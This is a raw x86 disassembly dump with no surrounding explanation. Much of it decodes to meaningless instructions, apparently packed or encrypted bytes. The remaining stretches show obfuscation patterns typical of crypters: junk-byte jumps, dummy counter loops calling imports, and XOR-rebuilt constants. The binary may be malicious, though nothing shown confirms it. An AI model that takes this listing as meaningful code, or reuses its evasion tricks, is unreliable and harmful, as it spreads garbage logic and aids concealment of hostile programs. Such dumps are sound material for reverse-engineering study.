  40e1e6:	cmp    al,0xa2
  40e1e8:	pusha  
  40e1e9:	cmc    
  40e1ea:	or     ch,ah
  40e1ec:	and    dl,BYTE PTR [esi+ecx*4-0x506a976c]
  40e1f3:	pop    esp
  40e1f4:	mov    BYTE PTR [eax+0x362a9eac],al
  40e1fa:	push   0x16
  40e1fc:	stc    
  40e1fd:	call   FWORD PTR [esp+ebx*4-0x4e]
  40e201:	mov    DWORD PTR [eax+0x2ee4ed13],ebp
  40e207:	add    DWORD PTR [edx-0xc0782db],eax
  40e20d:	(bad)  
  40e20e:	pop    es
  40e20f:	rcl    BYTE PTR [ebp+edi*8+0x35],0xfe
  40e214:	(bad)  
  40e215:	out    dx,eax
  40e216:	(bad)  
  40e217:	mov    bh,0xc8
  40e219:	jne    0x40e19e
  40e21b:	outs   dx,BYTE PTR ds:[esi]
  40e21c:	mov    ds:0x1c98f48b,al
  40e221:	sub    cl,BYTE PTR [ecx-0x7074eebc]
  40e227:	push   eax
  40e228:	mov    ch,0xf
  40e22a:	lea    edx,[ebx]
  40e22c:	jecxz  0x40e21f
  40e22e:	sub    al,0xc2
  40e230:	loope  0x40e1e4
  40e232:	frstor [esi+0x43df4f63]
  40e238:	loopne 0x40e2b6
  40e23a:	cs dec ebx
  40e23c:	imul   esi,eax,0x67
  40e23f:	dec    esi
  40e240:	jns    0x40e287
  40e242:	aas    
  40e243:	sbb    esp,DWORD PTR [ebp-0x4d]
  40e246:	or     esi,eax
  40e248:	dec    ebx
  40e249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e24a:	mov    ecx,0xf3cdff59
  40e24f:	test   eax,0x5e656fdc
  40e254:	not    ah
  40e256:	out    dx,al
  40e257:	movsx  esi,BYTE PTR [esi-0x2dafeb06]
  40e25e:	inc    edi
  40e25f:	call   0xcbb8:0xfdb46542
  40e266:	js     0x40e1f9
  40e268:	aad    0x9a
  40e26a:	jp     0x40e260
  40e26c:	ins    BYTE PTR es:[edi],dx
  40e26d:	push   ecx
  40e26e:	adc    DWORD PTR [eax-0x41436bf5],ebx
  40e274:	or     esi,DWORD PTR [eax-0x24ff82c9]
  40e27a:	mov    bh,0x46
  40e27c:	stos   DWORD PTR es:[edi],eax
  40e27d:	dec    eax
  40e27e:	test   esi,edx
  40e280:	inc    ecx
  40e281:	adc    BYTE PTR [edx+0x62],al
  40e284:	sbb    DWORD PTR [ebx+0x25675a82],esp
  40e28a:	fs mov cl,ch
  40e28d:	ret    0xf11c
  40e290:	in     eax,dx
  40e291:	fs mov ah,0x13
  40e294:	sbb    DWORD PTR [edi+edi*1-0x6d],edx
  40e298:	ss int 0xcf
  40e29b:	sti    
  40e29c:	aas    
  40e29d:	stos   BYTE PTR es:[edi],al
  40e29e:	xor    eax,0x50fe52cc
  40e2a3:	adc    dh,BYTE PTR [esi]
  40e2a5:	sub    eax,0xc3ae4971
  40e2aa:	and    al,0x7f
  40e2ac:	push   edx
  40e2ad:	mov    ch,0xe0
  40e2af:	pop    esp
  40e2b0:	xchg   ecx,edx
  40e2b2:	pop    es
  40e2b3:	mov    ebx,0x2b2bbbd6
  40e2b8:	and    edi,DWORD PTR [esp+eax*4+0xd19aa14]
  40e2bf:	iret   
  40e2c0:	pop    ecx
  40e2c1:	mov    ebp,0x6308ee82
  40e2c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2c7:	cld    
  40e2c8:	or     cl,BYTE PTR [edx+esi*2+0x13]
  40e2cc:	inc    edi
  40e2cd:	jne    0x40e28a
  40e2cf:	mov    edi,0x770b3e33
  40e2d4:	pushf  
  40e2d5:	pop    ebp
  40e2d6:	inc    eax
  40e2d7:	push   edi
  40e2d8:	fld    QWORD PTR [ebx-0x495f79f7]
  40e2de:	mov    ebx,ds
  40e2e0:	ficomp WORD PTR [edi-0xe306769]
  40e2e6:	xchg   DWORD PTR [eax-0x2426ba60],ebp
  40e2ec:	sbb    ah,BYTE PTR [edi]
  40e2ee:	mov    ecx,0x6a88a78e
  40e2f3:	leave  
  40e2f4:	lahf   
  40e2f5:	rcr    DWORD PTR [esi+0x49998209],1
  40e2fb:	rcr    DWORD PTR [ecx+0x2a87a04c],0x7a
  40e302:	addr16 mov ebx,0x1802a601
  40e308:	cmp    edi,esi
  40e30a:	adc    al,0x39
  40e30c:	push   edx
  40e30d:	and    esp,DWORD PTR [ecx]
  40e30f:	daa    
  40e310:	int3   
  40e311:	sbb    al,0x33
  40e313:	and    DWORD PTR [ebx],edx
  40e315:	iret   
  40e316:	push   ecx
  40e317:	and    dh,BYTE PTR [edx+0xa]
  40e31a:	fadd   QWORD PTR [edi+esi*8]
  40e31d:	in     al,dx
  40e31e:	stc    
  40e31f:	sub    al,BYTE PTR [eax-0x256f94f7]
  40e325:	lea    edx,[esi+0x6d]
  40e328:	mov    al,ds:0x25247ef5
  40e32d:	shl    BYTE PTR [edi+0x61],0xeb
  40e331:	idiv   DWORD PTR [esi+0x1d2334b]
  40e337:	pop    ebp
  40e338:	hlt    
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433617,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433727,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4336eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43366b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4336bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433667,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4336af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	jmp    esi
  40e3c0:	imul   esp,DWORD PTR [esi+0x7ea43fd5],0x7e
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e3a5
  40e3cc:	lock je 0x40e43a
  40e3cf:	add    eax,0x13152ca5
  40e3d4:	lock mov eax,ds:0xc1c0936e
  40e3da:	cwde   
  40e3db:	lea    ebx,[eax]
  40e3dd:	xchg   ecx,eax
  40e3de:	add    eax,0x157bb640
  40e3e3:	pop    ds
  40e3e4:	inc    ecx
  40e3e5:	xchg   edi,eax
  40e3e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3e7:	pushf  
  40e3e8:	inc    ebp
  40e3e9:	adc    BYTE PTR [ecx],ch
  40e3eb:	push   cs
  40e3ec:	mov    ch,0xe0
  40e3ee:	or     eax,0x7b7d28f6
  40e3f3:	jnp    0x40e393
  40e3f5:	sbb    al,0xe4
  40e3f7:	push   0xffffffeb
  40e3f9:	xor    eax,0x2437aa09
  40e3fe:	sub    esp,ecx
  40e400:	adc    eax,0x3d7c4ad4
  40e405:	cmp    BYTE PTR [eax+0x22],bl
  40e408:	sbb    esi,DWORD PTR [eax-0x6d]
  40e40b:	jle    0x40e398
  40e40d:	in     eax,0x8a
  40e40f:	unpcklps xmm0,xmm0
  40e412:	retf   0x29bf
  40e415:	popa   
  40e416:	in     al,0x98
  40e418:	mov    eax,0x3939106c
  40e41d:	shl    BYTE PTR [esi+0x27],0x3
  40e421:	pop    esi
  40e422:	adc    eax,0x714f1d6a
  40e427:	stos   DWORD PTR es:[edi],eax
  40e428:	mov    eax,0x14eb6d4
  40e42d:	retf   0x69eb
  40e430:	mov    es,WORD PTR [eax-0x25]
  40e433:	jb     0x40e436
  40e435:	stc    
  40e436:	adc    dh,BYTE PTR [ecx-0x1]
  40e439:	iret   
  40e43a:	pop    esi
  40e43b:	lahf   
  40e43c:	je     0x40e49c
  40e43e:	lds    edi,FWORD PTR [ebp+ecx*4-0xf]
  40e442:	mov    esp,0x71ce4252
  40e447:	sub    ah,BYTE PTR [ebp+0x49]
  40e44a:	cs nop
  40e44c:	and    eax,0x1f3399a6
  40e451:	loopne 0x40e41d
  40e453:	dec    ebx
  40e454:	(bad)  
  40e455:	xchg   ebp,eax
  40e456:	psubq  mm3,mm6
  40e459:	push   edx
  40e45a:	dec    eax
  40e45b:	(bad)  
  40e45c:	cmp    al,0xea
  40e45e:	mov    ch,0x1a
  40e460:	push   edi
  40e461:	dec    esp
  40e462:	mov    cl,cl
  40e464:	rol    DWORD PTR [edx],1
  40e466:	xchg   DWORD PTR [esi-0x2b],edi
  40e469:	(bad)  
  40e46a:	mov    DWORD PTR [edi+edx*1],ebp
  40e46d:	or     bl,BYTE PTR [ecx-0x41f4cbda]
  40e473:	addr16 repnz or al,0xbd
  40e477:	fmul   st(5),st
  40e479:	add    eax,0x92fc306b
  40e47e:	mov    ch,0x87
  40e480:	inc    esp
  40e481:	pop    ebp
  40e482:	pop    ebp
  40e483:	loope  0x40e436
  40e485:	retf   0x2c9d
  40e488:	lahf   
  40e489:	mov    BYTE PTR [ebx-0x79848d8b],bh
  40e48f:	lods   al,BYTE PTR ds:[esi]
  40e490:	sahf   
  40e491:	pop    edi
  40e492:	hlt    
  40e493:	dec    ecx
  40e494:	dec    esp
  40e495:	lea    esp,[ecx-0x15]
  40e498:	and    ebp,DWORD PTR [edx+0x6a75c73]
  40e49e:	out    0x17,eax
  40e4a0:	jge    0x40e4ba
  40e4a2:	xchg   esi,eax
  40e4a3:	js     0x40e4cb
  40e4a5:	stos   DWORD PTR es:[edi],eax
  40e4a6:	lods   eax,DWORD PTR ds:[esi]
  40e4a7:	hlt    
  40e4a8:	push   0xdaa659b9
  40e4ad:	jae    0x40e447
  40e4af:	hlt    
  40e4b0:	sbb    ecx,eax
  40e4b2:	inc    ebp
  40e4b3:	in     eax,0xa7
  40e4b5:	(bad)  
  40e4b6:	sub    edx,DWORD PTR [esi+edx*8]
  40e4b9:	in     eax,0x9a
  40e4bb:	mov    bh,bl
  40e4bd:	loop   0x40e49d
  40e4bf:	lods   al,BYTE PTR ds:[esi]
  40e4c0:	ss iret 
  40e4c2:	cmp    DWORD PTR [ecx-0x6c],edi
  40e4c5:	lods   al,BYTE PTR ds:[esi]
  40e4c6:	dec    eax
  40e4c7:	icebp  
  40e4c8:	dec    ecx
  40e4ca:	dec    esp
  40e4cb:	lahf   
  40e4cc:	in     al,dx
  40e4cd:	js     0x40e4b6
  40e4cf:	dec    esi
  40e4d0:	inc    edx
  40e4d1:	dec    edi
  40e4d2:	sbb    eax,0x9004d47c
  40e4d7:	arpl   WORD PTR [ebp-0x7bf0f8d9],cx
  40e4dd:	cli    
  40e4de:	add    DWORD PTR [eax],eax
  40e4e0:	add    BYTE PTR [ecx+0x43373305],al
  40e4e6:	add    BYTE PTR [ebp-0x74ffffce],bh
  40e4ec:	inc    ebp
  40e4ed:	cld    
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433617,0x4336bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433733,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4336a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4336a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4336a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4336a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4336a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4336a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4336a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4336a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4336bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4336b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43367b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0x317b9328
  40e5c1:	rdtsc  
  40e5c3:	iret   
  40e5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5c5:	jle    0x40e645
  40e5c7:	push   cs
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e5ea
  40e5cc:	pop    ebx
  40e5cd:	add    BYTE PTR [esi+0x38516096],ah
  40e5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5d4:	or     edi,ebp
  40e5d6:	xlat   BYTE PTR ds:[ebx]
  40e5d7:	add    bl,bl
  40e5d9:	inc    eax
  40e5da:	(bad)  
  40e5db:	lahf   
  40e5dc:	aam    0xd4
  40e5de:	jo     0x40e5e2
  40e5e0:	pop    es
  40e5e1:	outs   dx,BYTE PTR ds:[esi]
  40e5e2:	stc    
  40e5e3:	fucomi st,st(1)
  40e5e5:	xchg   ecx,edx
  40e5e7:	cmp    bh,BYTE PTR [edi]
  40e5e9:	pop    esi
  40e5ea:	sbb    eax,0xa6286e6d
  40e5ef:	cmp    ebp,DWORD PTR [ecx]
  40e5f1:	je     0x40e588
  40e5f3:	mov    esp,0xe941065c
  40e5f8:	sahf   
  40e5f9:	and    ch,BYTE PTR [ebx+0x38]
  40e5fc:	int3   
  40e5fd:	lds    esp,FWORD PTR ds:0x86b3cacc
  40e603:	pop    es
  40e604:	pop    ss
  40e605:	imul   DWORD PTR [eax-0x7e]
  40e608:	arpl   WORD PTR [edi],si
  40e60a:	sub    eax,0x4e9b94e3
  40e60f:	adc    eax,DWORD PTR [eax+esi*4]
  40e612:	adc    al,0x29
  40e614:	push   cs
  40e615:	sbb    al,0xad
  40e617:	rol    BYTE PTR [edx+0x2d532000],1
  40e61d:	jmp    0x40e5e1
  40e61f:	js     0x40e5e1
  40e621:	dec    edx
  40e622:	jno    0x40e5b6
  40e624:	or     al,0xd3
  40e626:	int    0x34
  40e628:	mov    WORD PTR [ecx-0x8f395c4],?
  40e62e:	cmp    BYTE PTR [edi+0x63],bh
  40e631:	in     al,0x1d
  40e633:	retf   0x53f7
  40e636:	aaa    
  40e637:	xor    DWORD PTR [ebx+edx*8-0x1e80eedf],edi
  40e63e:	cmp    BYTE PTR ds:0x9f6436cc,ch
  40e644:	fs loop 0x40e638
  40e647:	jne    0x40e68d
  40e649:	ret    0xf215
  40e64c:	cmp    DWORD PTR [edi-0x532ff9c],esi
  40e652:	adc    al,0x8
  40e654:	dec    esi
  40e655:	push   esp
  40e656:	repnz scas al,BYTE PTR es:[edi]
  40e658:	lods   eax,DWORD PTR ds:[esi]
  40e659:	int3   
  40e65a:	aam    0x12
  40e65c:	paddq  mm1,QWORD PTR [edi]
  40e65f:	and    ebp,esi
  40e661:	fchs   
  40e663:	sub    BYTE PTR [ebp+0x43],ch
  40e666:	mov    edx,DWORD PTR [ecx+0x11734d82]
  40e66c:	outs   dx,BYTE PTR ds:[esi]
  40e66d:	(bad)  
  40e66e:	mov    ah,0x51
  40e671:	fcmovne st,st(6)
  40e673:	cmp    eax,0xeece9201
  40e678:	xchg   ebp,eax
  40e679:	call   0xec54beda
  40e67e:	mov    ebp,0xe40ab64c
  40e683:	jp     0x40e6ec
  40e685:	stos   BYTE PTR es:[edi],al
  40e686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e687:	add    DWORD PTR [ebp-0x5e],0xa0a5e5ca
  40e68e:	cld    
  40e68f:	data16 (bad) 
  40e691:	xor    BYTE PTR [esi+ecx*1-0x4c4f90d1],ch
  40e698:	dec    eax
  40e699:	enter  0x64df,0xaf
  40e69d:	mov    ah,0x48
  40e69f:	dec    ecx
  40e6a0:	(bad)  
  40e6a1:	jg     0x40e626
  40e6a3:	gs mov eax,0x7e3ade02
  40e6a9:	retf   0x904f
  40e6ac:	scas   al,BYTE PTR es:[edi]
  40e6ad:	cli    
  40e6ae:	push   0x3f
  40e6b0:	mov    ebx,0xa27e76b6
  40e6b5:	xchg   esi,eax
  40e6b6:	mov    eax,0x4da406a
  40e6bb:	out    0xc2,eax
  40e6bd:	jle    0x40e6b6
  40e6bf:	or     al,0xea
  40e6c1:	aas    
  40e6c2:	xchg   ebp,eax
  40e6c3:	ss inc esi
  40e6c5:	mov    bh,0x3f
  40e6c7:	cwde   
  40e6c8:	push   esp
  40e6c9:	aam    0xd1
  40e6cb:	mov    al,ds:0x9c63c3a9
  40e6d0:	sub    al,0x1c
  40e6d2:	das    
  40e6d3:	sub    al,0xa4
  40e6d5:	dec    esi
  40e6d6:	in     al,0x49
  40e6d8:	jae    0x40e6c5
  40e6da:	lds    ecx,FWORD PTR [ebx+0x4d8bfc45]
  40e6e0:	adc    BYTE PTR [ebx],dh
  40e6e2:	mov    DWORD PTR [ebx],0xfc13bc6
  40e6e8:	test   DWORD PTR [eax+0x1],edx
  40e6eb:	add    BYTE PTR [eax],al
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0x7d2930a1
  40e707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e708:	jg     0x40e6e9
  40e70a:	mov    ds:0x7f0e7e7e,al
  40e70f:	jle    0x40e78f
  40e711:	xchg   ebp,eax
  40e712:	jmp    0x40e76e
  40e714:	xor    BYTE PTR [eax-0x20],0xeb
  40e718:	in     al,dx
  40e719:	sti    
  40e71a:	ds hlt 
  40e71c:	sbb    al,0x4e
  40e71e:	sbb    dh,BYTE PTR [edx-0x46]
  40e721:	(bad)  
  40e722:	(bad)  
  40e723:	xlat   BYTE PTR ds:[ebx]
  40e724:	adc    cl,dl
  40e726:	jo     0x40e6e4
  40e728:	cs fwait
  40e72a:	imul   edi,DWORD PTR [ebp-0x63],0x11c9d6b2
  40e731:	imul   ebx,DWORD PTR [ebp+0x708e8f2c],0xffffff96
  40e738:	lea    ebp,[ebp+0xbdcbeb7]
  40e73e:	into   
  40e73f:	and    ecx,esp
  40e741:	retf   0x17c2
  40e744:	out    dx,al
  40e745:	je     0x40e6eb
  40e747:	ins    BYTE PTR es:[edi],dx
  40e748:	pop    ss
  40e749:	rcl    DWORD PTR [ebx],1
  40e74b:	loope  0x40e735
  40e74d:	fwait
  40e74e:	adc    ecx,edi
  40e750:	ret    0xf4d6
  40e753:	imul   ebx,DWORD PTR [ebp+0x1100be8e],0xfebe9706
  40e75d:	mov    dl,0x97
  40e75f:	jge    0x40e775
  40e761:	sbb    dh,ah
  40e763:	xchg   ebp,eax
  40e764:	pushf  
  40e765:	sbb    edx,DWORD PTR [edx]
  40e767:	push   edi
  40e768:	push   eax
  40e769:	fcomp  DWORD PTR [edi+0x2c]
  40e76c:	push   eax
  40e76d:	imul   eax,edx,0xd875e920
  40e773:	pushf  
  40e774:	paddsb mm4,QWORD PTR [ebp+0x36739d5e]
  40e77b:	popa   
  40e77c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e77d:	dec    edi
  40e77e:	nop
  40e77f:	icebp  
  40e780:	xor    BYTE PTR [eax-0x742e488d],bh
  40e786:	repnz shl cl,0x96
  40e78a:	fchs   
  40e78c:	or     al,0x3a
  40e78e:	ret    
  40e78f:	dec    esi
  40e790:	pop    es
  40e791:	icebp  
  40e792:	(bad)  
  40e793:	retf   0xc3e
  40e796:	idiv   ch
  40e798:	std    
  40e799:	and    eax,0xf49dce12
  40e79e:	push   ss
  40e79f:	add    eax,0xbb8bc90
  40e7a4:	cmp    DWORD PTR [ecx+0x1858ea17],esi
  40e7aa:	mov    esi,0x2956c734
  40e7af:	test   DWORD PTR [edi-0x70],0x7781f9b5
  40e7b6:	loopne 0x40e7b8
  40e7b8:	mov    ah,0x55
  40e7ba:	gs or  ecx,edi
  40e7bd:	jmp    0x68ba:0x291b2cf4
  40e7c4:	jns    0x40e836
  40e7c6:	mov    BYTE PTR [eax+0x2e],ch
  40e7c9:	ds pop ecx
  40e7cb:	fld    TBYTE PTR ds:0x7d280090
  40e7d1:	mov    dl,0xac
  40e7d3:	sub    DWORD PTR [ebx-0x5819555b],ecx
  40e7d9:	mov    ch,0xe0
  40e7db:	fwait
  40e7dc:	aas    
  40e7dd:	mov    ch,0x43
  40e7df:	xchg   edi,eax
  40e7e0:	in     al,0xd7
  40e7e2:	cmp    dl,dl
  40e7e4:	inc    edx
  40e7e5:	enter  0x14a0,0x41
  40e7e9:	jnp    0x40e7cf
  40e7eb:	lock add eax,0xd95944a9
  40e7f1:	fwait
  40e7f2:	loopne 0x40e84c
  40e7f4:	(bad)  
  40e7f5:	xor    eax,0x438b56c8
  40e7fa:	mov    cl,0x2f
  40e7fc:	push   ds
  40e7fd:	jge    0x40e7f4
  40e7ff:	popa   
  40e800:	mov    ecx,0xc38e5e79
  40e805:	and    DWORD PTR [edx+0x70],eax
  40e808:	push   ebx
  40e809:	and    edx,DWORD PTR [ebx]
  40e80b:	in     eax,0x79
  40e80d:	inc    esp
  40e80e:	mov    al,0x2
  40e810:	jmp    0x40e7c9
  40e812:	jmp    ecx
  40e814:	push   esp
  40e815:	(bad)  
  40e816:	pusha  
  40e817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e818:	xor    al,0x80
  40e81a:	pop    edi
  40e81b:	loopne 0x40e7d3
  40e81d:	pop    es
  40e81e:	fiadd  DWORD PTR [ebp+0xa]
  40e821:	mov    ds:0x413c62,eax
  40e826:	mov    eax,DWORD PTR [ebp-0x4]
  40e829:	xor    eax,edi
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43373f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43373f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43373f,ebx
  40e870:	cmp    DWORD PTR ds:0x43373f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43373f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4336bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4336ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4336ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4336ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4336ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43367f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4336ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4336ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4336ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4336ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4336f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4336f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4336f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4336f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4336f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4336f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4336f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4336f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4336a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43362b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43361b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43361b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43361b,edi
  40e999:	cmp    DWORD PTR ds:0x43361b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4336bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43361b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43361b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43366b,0x43360f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433737,0x4336bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43367f,0x4336bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4336ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43361f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0x23103a68,al
  40ea30:	xchg   ch,dh
  40ea32:	int    0xef
  40ea34:	mov    ds:0x7c0e7e7e,eax
  40ea39:	jle    0x40eab9
  40ea3b:	in     al,dx
  40ea3c:	or     DWORD PTR [ecx-0x2a],0xffffffee
  40ea40:	test   eax,0x8a028b6b
  40ea45:	retf   0xbb82
  40ea48:	mov    ch,0xbb
  40ea4a:	xchg   BYTE PTR [edx-0x195ca9a9],al
  40ea50:	pop    ecx
  40ea51:	add    edi,edi
  40ea53:	(bad)  
  40ea54:	dec    ebx
  40ea55:	imul   edi,DWORD PTR [eax],0x42291c19
  40ea5b:	out    0xb1,al
  40ea5d:	and    dh,al
  40ea5f:	dec    esi
  40ea60:	pop    DWORD PTR [ebx+0x72]
  40ea63:	idiv   esp
  40ea65:	cwde   
  40ea66:	mov    esi,0xcdcc6357
  40ea6b:	xor    ecx,0xca7d53bd
  40ea71:	and    esp,DWORD PTR [edi+edi*1+0x3e]
  40ea75:	and    al,BYTE PTR [ebp+0x68c96775]
  40ea7b:	or     BYTE PTR [eax],bh
  40ea7d:	stc    
  40ea7e:	xchg   edx,eax
  40ea7f:	and    ebp,esp
  40ea81:	jae    0x40ea22
  40ea83:	adc    al,0x78
  40ea85:	or     al,0x35
  40ea87:	inc    esi
  40ea88:	adc    bl,ch
  40ea8a:	xor    ch,BYTE PTR ds:0xb6221e87
  40ea90:	jno    0x40ea3c
  40ea92:	clc    
  40ea93:	sub    al,bh
  40ea95:	and    ecx,eax
  40ea97:	ss push cs
  40ea99:	xor    ebx,DWORD PTR [edx]
  40ea9b:	cli    
  40ea9c:	out    dx,al
  40ea9d:	push   ecx
  40ea9e:	pushf  
  40ea9f:	loope  0x40eab6
  40eaa1:	pop    ebp
  40eaa2:	gs adc dh,bl
  40eaa5:	test   DWORD PTR [eax+0x5a4bebe6],edi
  40eaab:	xchg   BYTE PTR [edx],al
  40eaad:	pop    es
  40eaae:	xchg   ecx,eax
